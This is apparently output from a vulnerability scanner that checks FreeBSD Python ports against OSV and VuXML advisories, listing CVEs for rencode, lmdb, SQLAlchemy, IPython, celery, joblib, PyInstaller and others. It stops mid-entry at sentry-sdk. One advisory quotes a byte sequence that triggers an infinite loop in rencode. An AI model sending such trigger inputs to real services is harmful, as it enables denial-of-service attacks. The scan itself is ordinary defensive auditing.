WARNING:root:Error while fetching 'https://pypi.org/pypi/libgetar/1.1.3/json': HTTP Error 404: Not Found
WARNING:root:Error while fetching 'https://pypi.org/pypi/mrchem/1.1.2/json': HTTP Error 404: Not Found
WARNING:root:Error while fetching 'https://pypi.org/pypi/optking/0.2.1/json': HTTP Error 404: Not Found
WARNING:root:Error while fetching 'https://pypi.org/pypi/paida/3.2.1.2.10/json': HTTP Error 404: Not Found
WARNING:root:Error while fetching 'https://pypi.org/pypi/pyaixi/1.0.4/json': HTTP Error 404: Not Found
WARNING:root:Error while fetching 'https://pypi.org/pypi/pygmo2/2.18.0/json': HTTP Error 404: Not Found
WARNING:root:Error while fetching 'https://pypi.org/pypi/pyked/0.4.1-16/json': HTTP Error 404: Not Found
WARNING:root:Error while fetching 'https://pypi.org/pypi/pymol/2.5.0-97/json': HTTP Error 404: Not Found
WARNING:root:Error while fetching 'https://pypi.org/pypi/qiskit-ibm-provider/g20220804/json': HTTP Error 404: Not Found
WARNING:root:Error while fetching 'https://pypi.org/pypi/rmf/1.5.0/json': HTTP Error 404: Not Found
WARNING:root:Error while fetching 'https://pypi.org/pypi/sdf/0.1/json': HTTP Error 404: Not Found
WARNING:root:Error while fetching 'https://pypi.org/pypi/cerealizer/0.7/json': HTTP Error 404: Not Found
WARNING:root:Error while fetching 'https://pypi.org/pypi/certbot-dns-gandi/1.4.0/json': HTTP Error 404: Not Found
WARNING:root:Error while fetching 'https://pypi.org/pypi/fail2ban/1.0.2/json': HTTP Error 404: Not Found
WARNING:root:Error while fetching 'https://pypi.org/pypi/first-server/0.0.7/json': HTTP Error 404: Not Found
WARNING:root:Error while fetching 'https://pypi.org/pypi/gnupg/3.1.1/json': HTTP Error 404: Not Found
WARNING:root:Error while fetching 'https://pypi.org/pypi/gnutls/3.1.3/json': HTTP Error 404: Not Found
WARNING:root:Error while fetching 'https://pypi.org/pypi/gpgme/1.18.0/json': HTTP Error 404: Not Found
WARNING:root:Error while fetching 'https://pypi.org/pypi/htpasswd/2019.10.15/json': HTTP Error 404: Not Found
WARNING:root:Error while fetching 'https://pypi.org/pypi/keepkey/7.2.1/json': HTTP Error 404: Not Found
WARNING:root:Error while fetching 'https://pypi.org/pypi/openssl/20.0.1/json': HTTP Error 404: Not Found
WARNING:root:Error while fetching 'https://pypi.org/pypi/pass-audit/1.1/json': HTTP Error 404: Not Found
WARNING:root:Error while fetching 'https://pypi.org/pypi/pass-git-helper/1.2.0/json': HTTP Error 404: Not Found
WARNING:root:Error while fetching 'https://pypi.org/pypi/potr/1.0.1/json': HTTP Error 404: Not Found
WARNING:root:Error while fetching 'https://pypi.org/pypi/pyelliptic/2.0.1/json': HTTP Error 404: Not Found
WARNING:root:Error while fetching 'https://pypi.org/pypi/python-registry/1.4/json': HTTP Error 404: Not Found
WARNING:root:Error while fetching 'https://pypi.org/pypi/ropper/1.13.7/json': HTTP Error 404: Not Found
WARNING:root:Error while fetching 'https://pypi.org/pypi/sequoia/0.19.0/json': HTTP Error 404: Not Found
WARNING:root:Error while fetching 'https://pypi.org/pypi/volatility3/g20200510/json': HTTP Error 404: Not Found
WARNING:root:Error while fetching 'https://pypi.org/pypi/yara/4.2.3/json': HTTP Error 404: Not Found
WARNING:root:Error while fetching 'https://pypi.org/pypi/wapiti/3.0.3/json': HTTP Error 404: Not Found
WARNING:root:Error while fetching 'https://pypi.org/pypi/ansible-iocage/g20200327/json': HTTP Error 404: Not Found
WARNING:root:Error while fetching 'https://pypi.org/pypi/ansible/g20200803/json': HTTP Error 404: Not Found
WARNING:root:Error while fetching 'https://pypi.org/pypi/ansible-sysrc-g20200803/py39-ansible-sysrc-g20200803/json': HTTP Error 404: Not Found
WARNING:root:Error while fetching 'https://pypi.org/pypi/iocage/1.2/json': HTTP Error 404: Not Found
WARNING:root:Error while fetching 'https://pypi.org/pypi/iocage-devel/1.2.20211001/json': HTTP Error 404: Not Found
WARNING:root:Error while fetching 'https://pypi.org/pypi/azure-cli-base/1.0.0/json': HTTP Error 404: Not Found
WARNING:root:Error while fetching 'https://pypi.org/pypi/focker/2.0/json': HTTP Error 404: Not Found
WARNING:root:Error while fetching 'https://pypi.org/pypi/google-compute-engine/2.8.17/json': HTTP Error 404: Not Found
WARNING:root:Error while fetching 'https://pypi.org/pypi/hpilo/4.4.3/json': HTTP Error 404: Not Found
WARNING:root:Error while fetching 'https://pypi.org/pypi/ioztat/2.0.1/json': HTTP Error 404: Not Found
WARNING:root:Error while fetching 'https://pypi.org/pypi/prometheus-zfs/1.0.4/json': HTTP Error 404: Not Found
WARNING:root:Error while fetching 'https://pypi.org/pypi/pytsk/20210419/json': HTTP Error 404: Not Found
WARNING:root:Error while fetching 'https://pypi.org/pypi/pywatchman/4.9.0/json': HTTP Error 404: Not Found
WARNING:root:Error while fetching 'https://pypi.org/pypi/ranger/1.9.3/json': HTTP Error 404: Not Found
WARNING:root:Error while fetching 'https://pypi.org/pypi/cloud_sptheme/1.10.1/json': HTTP Error 404: Not Found
WARNING:root:Error while fetching 'https://pypi.org/pypi/creole/1.4.10/json': HTTP Error 404: Not Found
WARNING:root:Error while fetching 'https://pypi.org/pypi/dialect/2.1.1/json': HTTP Error 404: Not Found
WARNING:root:Error while fetching 'https://pypi.org/pypi/enchant/3.2.2/json': HTTP Error 404: Not Found
WARNING:root:Error while fetching 'https://pypi.org/pypi/langid/1.1.6-20170715/json': HTTP Error 404: Not Found
WARNING:root:Error while fetching 'https://pypi.org/pypi/libxml2/2.10.3/json': HTTP Error 404: Not Found
WARNING:root:Error while fetching 'https://pypi.org/pypi/pypa-docs-theme/g20180622/json': HTTP Error 404: Not Found
WARNING:root:Error while fetching 'https://pypi.org/pypi/reverend/0.3/json': HTTP Error 404: Not Found
WARNING:root:Error while fetching 'https://pypi.org/pypi/rss2gen/1.1/json': HTTP Error 404: Not Found
WARNING:root:Error while fetching 'https://pypi.org/pypi/sphinx_wikipedia/20150903/json': HTTP Error 404: Not Found
WARNING:root:Error while fetching 'https://pypi.org/pypi/ucl/0.8.2/json': HTTP Error 404: Not Found
WARNING:root:Error while fetching 'https://pypi.org/pypi/wordnet/2.0.1/json': HTTP Error 404: Not Found
WARNING:root:Error while fetching 'https://pypi.org/pypi/zpt/2.5/json': HTTP Error 404: Not Found
WARNING:root:Error while fetching 'https://pypi.org/pypi/onionshare/2.6/json': HTTP Error 404: Not Found
WARNING:root:Error while fetching 'https://pypi.org/pypi/beautifulsoup/4.11.2/json': HTTP Error 404: Not Found
WARNING:root:Error while fetching 'https://pypi.org/pypi/django-ldapdb/1.5.1-7/json': HTTP Error 404: Not Found
WARNING:root:Error while fetching 'https://pypi.org/pypi/django-mezzanine-filebrowser/1.1.1/json': HTTP Error 404: Not Found
WARNING:root:Error while fetching 'https://pypi.org/pypi/django-mezzanine-grappelli/1.1.1/json': HTTP Error 404: Not Found
WARNING:root:Error while fetching 'https://pypi.org/pypi/recaptcha/3.0.0/json': HTTP Error 404: Not Found
WARNING:root:Error while fetching 'https://pypi.org/pypi/templatetag-sugar/1.0/json': HTTP Error 404: Not Found
WARNING:root:Error while fetching 'https://pypi.org/pypi/fake-useragent/1.1.2/json': HTTP Error 404: Not Found
WARNING:root:Error while fetching 'https://pypi.org/pypi/flask-api/3.0/json': HTTP Error 404: Not Found
WARNING:root:Error while fetching 'https://pypi.org/pypi/flask-peewee/3.0.5/json': HTTP Error 404: Not Found
WARNING:root:Error while fetching 'https://pypi.org/pypi/pyjwt1/1.7.1/json': HTTP Error 404: Not Found
WARNING:root:Error while fetching 'https://pypi.org/pypi/qt5-webengine/5.15.6/json': HTTP Error 404: Not Found
WARNING:root:Error while fetching 'https://pypi.org/pypi/qt6-webengine/6.4.0/json': HTTP Error 404: Not Found
WARNING:root:Error while fetching 'https://pypi.org/pypi/recaptcha/1.0.6/json': HTTP Error 404: Not Found
WARNING:root:Error while fetching 'https://pypi.org/pypi/seafdav/9.0.10/json': HTTP Error 404: Not Found
WARNING:root:Error while fetching 'https://pypi.org/pypi/seafobj/9.0.10/json': HTTP Error 404: Not Found
WARNING:root:Error while fetching 'https://pypi.org/pypi/ttrv/1.27.3/json': HTTP Error 404: Not Found
WARNING:root:Error while fetching 'https://pypi.org/pypi/woob-qt/2.0-27/json': HTTP Error 404: Not Found
WARNING:root:Error while fetching 'https://pypi.org/pypi/web2ldap/1.7.7/json': HTTP Error 404: Not Found
WARNING:root:Error while fetching 'https://pypi.org/pypi/webpy/0.62/json': HTTP Error 404: Not Found
WARNING:root:Error while fetching 'https://pypi.org/pypi/xist/5.34/json': HTTP Error 404: Not Found
WARNING:root:Error while fetching 'https://pypi.org/pypi/menulibre/2.3.0/json': HTTP Error 404: Not Found
WARNING:root:Error while fetching 'https://pypi.org/pypi/python-xapp/2.2.2/json': HTTP Error 404: Not Found
WARNING:root:Error while fetching 'https://pypi.org/pypi/fltk/1.3.4.1/json': HTTP Error 404: Not Found
WARNING:root:Error while fetching 'https://pypi.org/pypi/qt5-chart/5.15.6/json': HTTP Error 404: Not Found
WARNING:root:Error while fetching 'https://pypi.org/pypi/qt6-chart/6.4.0/json': HTTP Error 404: Not Found
WARNING:root:Error while fetching 'https://pypi.org/pypi/tkinter/3.9.16/json': HTTP Error 404: Not Found
WARNING:root:Error while fetching 'https://pypi.org/pypi/tkinter/3.8.16/json': HTTP Error 404: Not Found
WARNING:root:Error while fetching 'https://pypi.org/pypi/tkinter/3.7.16/json': HTTP Error 404: Not Found
WARNING:root:Error while fetching 'https://pypi.org/pypi/tkinter/3.11.2/json': HTTP Error 404: Not Found
WARNING:root:Error while fetching 'https://pypi.org/pypi/tkinter/3.10.10/json': HTTP Error 404: Not Found
WARNING:root:Error while fetching 'https://pypi.org/pypi/tkinter/2.7.18/json': HTTP Error 404: Not Found
WARNING:root:Error while fetching 'https://pypi.org/pypi/tktreectrl/2.0.2/json': HTTP Error 404: Not Found

Found 45 vulnerable ports in 4075 Python packages ports:

FreeBSD's port 'py39-rencode-1.0.6_1' / PIP's package 'rencode-1.0.6' is vulnerable:
    Id:        PYSEC-2021-345
    Aliases:   ['CVE-2021-40839', 'GHSA-gh8j-2pgf-x458']
    Details:   The rencode package through 1.0.6 for Python allows an infinite loop in typecode decoding (such as via ;\x2f\x7f), enabling a remote attack that consumes CPU and memory.
    Fixed in:  []
    Link:      https://osv.dev/vulnerability/PYSEC-2021-345
    Source:    osv
    Summary:   None
    Withdrawn: None

    Id:        GHSA-gh8j-2pgf-x458
    Aliases:   ['CVE-2021-40839']
    Details:   The rencode package through 1.0.6 for Python allows an infinite loop in typecode decoding (such as via ;\x2f\x7f), enabling a remote attack that consumes CPU and memory.
    Fixed in:  []
    Link:      https://osv.dev/vulnerability/GHSA-gh8j-2pgf-x458
    Source:    osv
    Summary:   None
    Withdrawn: None

Vulnerabilities reported to FreeBSD VuXML:
>>> for version 1.0.6 >>>>>>>>>>>>>>>>>>>>>>>>
<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
>>> for any version >>>>>>>>>>>>>>>>>>>>>>>>
<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<



FreeBSD's port 'py39-Elixir-0.7.1_3' / PIP's package 'Elixir-0.7.1' is vulnerable:
    Id:        PYSEC-2012-13
    Aliases:   ['CVE-2012-2146']
    Details:   Elixir 0.8.0 uses Blowfish in CFB mode without constructing a unique initialization vector (IV), which makes it easier for context-dependent users to obtain sensitive information and decrypt the database.
    Fixed in:  []
    Link:      https://osv.dev/vulnerability/PYSEC-2012-13
    Source:    osv
    Summary:   None
    Withdrawn: None

Vulnerabilities reported to FreeBSD VuXML:
>>> for version 0.7.1 >>>>>>>>>>>>>>>>>>>>>>>>
<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
>>> for any version >>>>>>>>>>>>>>>>>>>>>>>>
<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<



FreeBSD's port 'py39-lmdb-0.97' / PIP's package 'lmdb-0.97' is vulnerable:
    Id:        PYSEC-2019-238
    Aliases:   ['CVE-2019-16226']
    Details:   An issue was discovered in py-lmdb 0.97. mdb_node_del does not validate a memmove in the case of an unexpected node->mn_hi, leading to an invalid write operation. NOTE: this outcome occurs when accessing a data.mdb file supplied by an attacker.
    Fixed in:  ['0.98']
    Link:      https://osv.dev/vulnerability/PYSEC-2019-238
    Source:    osv
    Summary:   None
    Withdrawn: None

    Id:        PYSEC-2019-239
    Aliases:   ['CVE-2019-16227']
    Details:   An issue was discovered in py-lmdb 0.97. For certain values of mn_flags, mdb_cursor_set triggers a memcpy with an invalid write operation within mdb_xcursor_init1. NOTE: this outcome occurs when accessing a data.mdb file supplied by an attacker.
    Fixed in:  ['0.98']
    Link:      https://osv.dev/vulnerability/PYSEC-2019-239
    Source:    osv
    Summary:   None
    Withdrawn: None

    Id:        PYSEC-2019-237
    Aliases:   ['CVE-2019-16225']
    Details:   An issue was discovered in py-lmdb 0.97. For certain values of mp_flags, mdb_page_touch does not properly set up mc->mc_pg[mc->top], leading to an invalid write operation. NOTE: this outcome occurs when accessing a data.mdb file supplied by an attacker.
    Fixed in:  ['0.98']
    Link:      https://osv.dev/vulnerability/PYSEC-2019-237
    Source:    osv
    Summary:   None
    Withdrawn: None

    Id:        PYSEC-2019-240
    Aliases:   ['CVE-2019-16228']
    Details:   An issue was discovered in py-lmdb 0.97. There is a divide-by-zero error in the function mdb_env_open2 if mdb_env_read_header obtains a zero value for a certain size field. NOTE: this outcome occurs when accessing a data.mdb file supplied by an attacker.
    Fixed in:  ['0.98']
    Link:      https://osv.dev/vulnerability/PYSEC-2019-240
    Source:    osv
    Summary:   None
    Withdrawn: None

    Id:        PYSEC-2019-236
    Aliases:   ['CVE-2019-16224']
    Details:   An issue was discovered in py-lmdb 0.97. For certain values of md_flags, mdb_node_add does not properly set up a memcpy destination, leading to an invalid write operation. NOTE: this outcome occurs when accessing a data.mdb file supplied by an attacker.
    Fixed in:  ['0.98']
    Link:      https://osv.dev/vulnerability/PYSEC-2019-236
    Source:    osv
    Summary:   None
    Withdrawn: None

Vulnerabilities reported to FreeBSD VuXML:
>>> for version 0.97 >>>>>>>>>>>>>>>>>>>>>>>>
<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
>>> for any version >>>>>>>>>>>>>>>>>>>>>>>>
<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<



FreeBSD's port 'py39-sqlalchemy10-1.0.14' / PIP's package 'sqlalchemy-1.0.14' is vulnerable:
    Id:        PYSEC-2019-124
    Aliases:   ['CVE-2019-7548', 'GHSA-38fc-9xqv-7f7q']
    Details:   SQLAlchemy 1.2.17 has SQL Injection when the group_by parameter can be controlled.
    Fixed in:  ['1.2.18']
    Link:      https://osv.dev/vulnerability/PYSEC-2019-124
    Source:    osv
    Summary:   None
    Withdrawn: None

    Id:        PYSEC-2019-123
    Aliases:   ['CVE-2019-7164', 'GHSA-887w-45rq-vxgf']
    Details:   SQLAlchemy through 1.2.17 and 1.3.x through 1.3.0b2 allows SQL Injection via the order_by parameter.
    Fixed in:  ['1.2.18']
    Link:      https://osv.dev/vulnerability/PYSEC-2019-123
    Source:    osv
    Summary:   None
    Withdrawn: None

    Id:        GHSA-38fc-9xqv-7f7q
    Aliases:   ['CVE-2019-7548']
    Details:   SQLAlchemy 1.2.17 has SQL Injection when the group_by parameter can be controlled.
    Fixed in:  ['1.3.0']
    Link:      https://osv.dev/vulnerability/GHSA-38fc-9xqv-7f7q
    Source:    osv
    Summary:   None
    Withdrawn: None

    Id:        GHSA-887w-45rq-vxgf
    Aliases:   ['CVE-2019-7164']
    Details:   SQLAlchemy through 1.2.17 and 1.3.x through 1.3.0b2 allows SQL Injection via the order_by parameter.
    Fixed in:  ['1.3.0']
    Link:      https://osv.dev/vulnerability/GHSA-887w-45rq-vxgf
    Source:    osv
    Summary:   None
    Withdrawn: None

Vulnerabilities reported to FreeBSD VuXML:
>>> for version 1.0.14 >>>>>>>>>>>>>>>>>>>>>>>>
<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
>>> for any version >>>>>>>>>>>>>>>>>>>>>>>>
<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<



FreeBSD's port 'py39-sqlalchemy11-1.1.18' / PIP's package 'sqlalchemy-1.1.18' is vulnerable:
    Id:        PYSEC-2019-124
    Aliases:   ['CVE-2019-7548', 'GHSA-38fc-9xqv-7f7q']
    Details:   SQLAlchemy 1.2.17 has SQL Injection when the group_by parameter can be controlled.
    Fixed in:  ['1.2.18']
    Link:      https://osv.dev/vulnerability/PYSEC-2019-124
    Source:    osv
    Summary:   None
    Withdrawn: None

    Id:        PYSEC-2019-123
    Aliases:   ['CVE-2019-7164', 'GHSA-887w-45rq-vxgf']
    Details:   SQLAlchemy through 1.2.17 and 1.3.x through 1.3.0b2 allows SQL Injection via the order_by parameter.
    Fixed in:  ['1.2.18']
    Link:      https://osv.dev/vulnerability/PYSEC-2019-123
    Source:    osv
    Summary:   None
    Withdrawn: None

    Id:        GHSA-38fc-9xqv-7f7q
    Aliases:   ['CVE-2019-7548']
    Details:   SQLAlchemy 1.2.17 has SQL Injection when the group_by parameter can be controlled.
    Fixed in:  ['1.3.0']
    Link:      https://osv.dev/vulnerability/GHSA-38fc-9xqv-7f7q
    Source:    osv
    Summary:   None
    Withdrawn: None

    Id:        GHSA-887w-45rq-vxgf
    Aliases:   ['CVE-2019-7164']
    Details:   SQLAlchemy through 1.2.17 and 1.3.x through 1.3.0b2 allows SQL Injection via the order_by parameter.
    Fixed in:  ['1.3.0']
    Link:      https://osv.dev/vulnerability/GHSA-887w-45rq-vxgf
    Source:    osv
    Summary:   None
    Withdrawn: None

Vulnerabilities reported to FreeBSD VuXML:
>>> for version 1.1.18 >>>>>>>>>>>>>>>>>>>>>>>>
<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
>>> for any version >>>>>>>>>>>>>>>>>>>>>>>>
<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<



FreeBSD's port 'py39-sqlalchemy12-1.2.19' / PIP's package 'sqlalchemy-1.2.19' is vulnerable:
    Id:        GHSA-38fc-9xqv-7f7q
    Aliases:   ['CVE-2019-7548']
    Details:   SQLAlchemy 1.2.17 has SQL Injection when the group_by parameter can be controlled.
    Fixed in:  ['1.3.0']
    Link:      https://osv.dev/vulnerability/GHSA-38fc-9xqv-7f7q
    Source:    osv
    Summary:   None
    Withdrawn: None

    Id:        GHSA-887w-45rq-vxgf
    Aliases:   ['CVE-2019-7164']
    Details:   SQLAlchemy through 1.2.17 and 1.3.x through 1.3.0b2 allows SQL Injection via the order_by parameter.
    Fixed in:  ['1.3.0']
    Link:      https://osv.dev/vulnerability/GHSA-887w-45rq-vxgf
    Source:    osv
    Summary:   None
    Withdrawn: None

Vulnerabilities reported to FreeBSD VuXML:
>>> for version 1.2.19 >>>>>>>>>>>>>>>>>>>>>>>>
<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
>>> for any version >>>>>>>>>>>>>>>>>>>>>>>>
<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<



FreeBSD's port 'py39-ipython-7.34.0' / PIP's package 'ipython-7.34.0' is vulnerable:
    Id:        GHSA-29gw-9793-fvw7
    Aliases:   ['CVE-2023-24816']
    Details:   IPython provides an interactive Python shell and Jupyter kernel to use Python interactively. Versions prior to 8.10.0 are vulnerable to command injection in the `set_term_title` [function](https://github.com/ipython/ipython/blob/3f0bf05f072a91b2a3042d23ce250e5e906183fd/IPython/utils/terminal.py#L103-L117) under specific conditions. This has been patched in version 8.10.0.

### Impact 
Users are only vulnerable when calling this function in Windows in a Python environment where [ctypes](https://docs.python.org/3/library/ctypes.html) is not available. The dependency on ctypes in `IPython.utils._process_win32` prevents the vulnerable code from ever being reached (making it effectively dead code). However, as a library that could be used by another tool, `set_term_title` could introduce a vulnerability for dependencies. Currently `set_term_title` is only called with (semi-)trusted input that contain the current working directory of the current IPython session. If an attacker can control directory names, and manage to get a user to `cd` into this directory, then the attacker can execute arbitrary commands contained in the folder names.
    Fixed in:  ['8.10']
    Link:      https://osv.dev/vulnerability/GHSA-29gw-9793-fvw7
    Source:    osv
    Summary:   None
    Withdrawn: None

Vulnerabilities reported to FreeBSD VuXML:
>>> for version 7.34.0 >>>>>>>>>>>>>>>>>>>>>>>>
<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
>>> for any version >>>>>>>>>>>>>>>>>>>>>>>>
Vulnerability ID: 290351c9-6f5c-11e5-a2a1-002590263bf5
  Topic: devel/ipython -- multiple vulnerabilities
  Affects:
    ipython:
      < 3.2.2 ; 
  References:
    freebsdpr: ports/203668
    cvename: CVE-2015-6938
    cvename: CVE-2015-7337
    url: http://www.openwall.com/lists/oss-security/2015/09/02/3
    url: https://github.com/ipython/ipython/commit/3ab41641cf6fce3860c73d5cf4645aa12e1e5892
    url: http://www.openwall.com/lists/oss-security/2015/09/16/3
    url: https://github.com/ipython/ipython/commit/0a8096adf165e2465550bd5893d7e352544e5967
  Discovery date: 2015-09-01
  Entry date: 2015-10-10

Vulnerability ID: 81326883-2905-11e5-a4a5-002590263bf5
  Topic: devel/ipython -- CSRF possible remote execution vulnerability
  Affects:
    ipython:
      >= 0.12 ; < 3.2.1 ; 
  References:
    cvename: CVE-2015-5607
    url: http://seclists.org/oss-sec/2015/q3/92
    url: http://ipython.org/ipython-doc/3/whatsnew/version3.html#ipython-3-2-1
  Discovery date: 2015-07-12
  Entry date: 2015-07-13
  Modified date: 2015-07-22

Vulnerability ID: a4460ac7-192c-11e5-9c01-bcaec55be5e5
  Topic: devel/ipython -- remote execution
  Affects:
    ipython:
      < 3.2.0 ; 
  References:
    cvename: CVE-2015-4706
    cvename: CVE-2015-4707
    url: http://seclists.org/oss-sec/2015/q2/779
  Discovery date: 2015-06-22
  Entry date: 2015-06-22

<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<



FreeBSD's port 'py39-celery-4.4.7' / PIP's package 'celery-4.4.7' is vulnerable:
    Id:        PYSEC-2021-858
    Aliases:   ['CVE-2021-23727', 'SNYK-PYTHON-CELERY-2314953', 'GHSA-q4xr-rc97-m4xx']
    Details:   This affects the package celery before 5.2.2. It by default trusts the messages and metadata stored in backends (result stores). When reading task metadata from the backend, the data is deserialized. Given that an attacker can gain access to, or somehow manipulate the metadata within a celery backend, they could trigger a stored command injection vulnerability and potentially gain further access to the system.
    Fixed in:  ['5.2.2']
    Link:      https://osv.dev/vulnerability/PYSEC-2021-858
    Source:    osv
    Summary:   None
    Withdrawn: None

    Id:        GHSA-q4xr-rc97-m4xx
    Aliases:   ['CVE-2021-23727']
    Details:   This affects the package celery before 5.2.2. It by default trusts the messages and metadata stored in backends (result stores). When reading task metadata from the backend, the data is deserialized. Given that an attacker can gain access to, or somehow manipulate the metadata within a celery backend, they could trigger a stored command injection vulnerability and potentially gain further access to the system.
    Fixed in:  ['5.2.2']
    Link:      https://osv.dev/vulnerability/GHSA-q4xr-rc97-m4xx
    Source:    osv
    Summary:   None
    Withdrawn: None

Vulnerabilities reported to FreeBSD VuXML:
>>> for version 4.4.7 >>>>>>>>>>>>>>>>>>>>>>>>
<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
>>> for any version >>>>>>>>>>>>>>>>>>>>>>>>
<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<



FreeBSD's port 'py39-joblib-1.1.0' / PIP's package 'joblib-1.1.0' is vulnerable:
    Id:        GHSA-6hrg-qmvc-2xh8
    Aliases:   ['CVE-2022-21797']
    Details:   The package joblib from 0 and before 1.2.0 is vulnerable to Arbitrary Code Execution via the `pre_dispatch` flag in `Parallel()` class due to the `eval()` statement.
    Fixed in:  ['1.2.0']
    Link:      https://osv.dev/vulnerability/GHSA-6hrg-qmvc-2xh8
    Source:    osv
    Summary:   None
    Withdrawn: None

    Id:        PYSEC-2022-288
    Aliases:   ['CVE-2022-21797']
    Details:   The package joblib from 0 and before 1.2.0 are vulnerable to Arbitrary Code Execution via the pre_dispatch flag in Parallel() class due to the eval() statement.
    Fixed in:  ['1.2.0']
    Link:      https://osv.dev/vulnerability/PYSEC-2022-288
    Source:    osv
    Summary:   None
    Withdrawn: None

Vulnerabilities reported to FreeBSD VuXML:
>>> for version 1.1.0 >>>>>>>>>>>>>>>>>>>>>>>>
<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
>>> for any version >>>>>>>>>>>>>>>>>>>>>>>>
<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<



FreeBSD's port 'py39-py-1.11.0' / PIP's package 'py-1.11.0' is vulnerable:
    Id:        GHSA-w596-4wvx-j9j6
    Aliases:   ['CVE-2022-42969']
    Details:   The py library through 1.11.0 for Python allows remote attackers to conduct a ReDoS (Regular expression Denial of Service) attack via a Subversion repository with crafted info data, because the InfoSvnCommand argument is mishandled.

The particular codepath in question is the regular expression at `py._path.svnurl.InfoSvnCommand.lspattern` and is only relevant when dealing with subversion (svn) projects. Notably the codepath is not used in the popular pytest project. The developers of the pytest package have released version `7.2.0` which removes their dependency on `py`. Users of `pytest` seeing alerts relating to this advisory may update to version `7.2.0` of `pytest` to resolve this issue. See https://github.com/pytest-dev/py/issues/287#issuecomment-1290407715 for additional context.
    Fixed in:  []
    Link:      https://osv.dev/vulnerability/GHSA-w596-4wvx-j9j6
    Source:    osv
    Summary:   None
    Withdrawn: None

    Id:        PYSEC-2022-42969
    Aliases:   ['CVE-2022-42969', 'GHSA-w596-4wvx-j9j6']
    Details:   The py library through 1.11.0 for Python allows remote attackers to conduct a ReDoS (Regular expression Denial of Service) attack via a Subversion repository with crafted info data, because the InfoSvnCommand argument is mishandled.
    Fixed in:  []
    Link:      https://osv.dev/vulnerability/PYSEC-2022-42969
    Source:    osv
    Summary:   None
    Withdrawn: None

Vulnerabilities reported to FreeBSD VuXML:
>>> for version 1.11.0 >>>>>>>>>>>>>>>>>>>>>>>>
<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
>>> for any version >>>>>>>>>>>>>>>>>>>>>>>>
<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<



FreeBSD's port 'py39-pyinstaller-3.5_1' / PIP's package 'pyinstaller-3.5' is vulnerable:
    Id:        PYSEC-2020-175
    Aliases:   ['CVE-2019-16784', 'GHSA-7fcj-pq9j-wh2r']
    Details:   In PyInstaller before version 3.6, only on Windows, a local privilege escalation vulnerability is present in this particular case: If a software using PyInstaller in "onefile" mode is launched by a privileged user (at least more than the current one) which have his "TempPath" resolving to a world writable directory. This is the case for example if the software is launched as a service or as a scheduled task using a system account (TempPath will be C:\Windows\Temp). In order to be exploitable the software has to be (re)started after the attacker launch the exploit program, so for a service launched at startup, a service restart is needed (e.g. after a crash or an upgrade).
    Fixed in:  ['3.6']
    Link:      https://osv.dev/vulnerability/PYSEC-2020-175
    Source:    osv
    Summary:   None
    Withdrawn: None

    Id:        GHSA-7fcj-pq9j-wh2r
    Aliases:   ['CVE-2019-16784']
    Details:   ### Impact

Local Privilege Escalation in all Windows software frozen by PyInstaller in "onefile" mode.

The vulnerability is present only on Windows and in this particular case: If a **software frozen by PyInstaller in "onefile" mode** is launched by a (privileged) user who has **his/her "TempPath" resolving to a world writable directory**. This is the case e.g. if the software is launched as a service or as a scheduled task using a system account (in which case TempPath will default to C:\Windows\Temp).

In order to be exploitable the software has to be (re)started after the attacker has launched the exploit program. So for a service launched at startup, a service restart is needed (e.g. after a crash or an upgrade).

While PyInstaller itself was not vulnerable, all Windows software frozen by PyInstaller in "onefile" mode is vulnerable.

CVSSv3 score 7.0 (High)
CVSSv3 vector CVSS:3.0/AV:L/AC:H/PR:L/UI:N/S:U/C:H/I:H/A:H

Affected
- all Windows software frozen by PyInstaller in "onefile" mode

No affected
- PyInstaller itself (except if frozen by PyInstaller in "onefile" mode on Windows)
- software frozen in "one*dir*" mode
- other platforms (GNU/Linux, OS X, BSD, etc.)

### Patches
The problem is patched in commits 42a67148b3bdf9211fda8499fdc5b63acdd7e6cc (fixed code) and be948cf0954707671aa499da17b10c86b6fa5e5c (recompiled bootloaders). Users should upgrade to PyInstaller version 3.6 and rebuild their software.

### Workarounds
There is no known workaround. Users using PyInstaller to freeze their Windows software using "onefile" mode should upgrade PyInstaller and rebuild their software.

### Credits
This vulnerability was discovered and reported by Farid AYOUJIL (@faridtsl), David HA, Florent LE NIGER and Yann GASCUEL (@lnv42) from Alter Solutions (@AlterSolutions) and fixed in collaboration with
Hartmut Goebel (@htgoebel, maintainer of PyInstaller).

### Funding Development

PyInstaller is in urgent need of funding to make future security fixes happen, see <https://github.com/pyinstaller/pyinstaller/issues/4404> for details.
    Fixed in:  ['3.6']
    Link:      https://osv.dev/vulnerability/GHSA-7fcj-pq9j-wh2r
    Source:    osv
    Summary:   None
    Withdrawn: None

Vulnerabilities reported to FreeBSD VuXML:
>>> for version 3.5 >>>>>>>>>>>>>>>>>>>>>>>>
<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
>>> for any version >>>>>>>>>>>>>>>>>>>>>>>>
<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<



FreeBSD's port 'py39-sentry-sdk-1.5.12' / PIP's package 'sentry-sdk-1.5.12' is vulnerable:
    Id:        GHSA-29pr-6jr8-q5jm
    Aliases:   ['CVE-2023-28117']
    Details:   ### Impact

